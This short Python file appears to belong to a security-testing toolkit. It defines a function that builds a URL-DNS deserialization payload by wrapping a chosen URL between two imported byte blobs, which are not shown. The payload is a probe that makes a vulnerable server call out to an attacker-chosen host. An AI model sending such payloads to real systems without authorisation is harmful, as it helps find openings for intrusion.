from src.payloads.generate_urldns_payload import payloads_1__generate_urldns_payload, \
    payloads_2__generate_urldns_payload


def generate_urldns_payload(url: str) -> bytes:
    """
    Generates a URL-DNS deserialization payload for Python 3.13+.
    """
    payload = payloads_1__generate_urldns_payload
    url_bytes = url.encode("utf-8")
    payload += len(url_bytes).to_bytes(1, "big") + url_bytes
    payload += payloads_2__generate_urldns_payload
    return payload
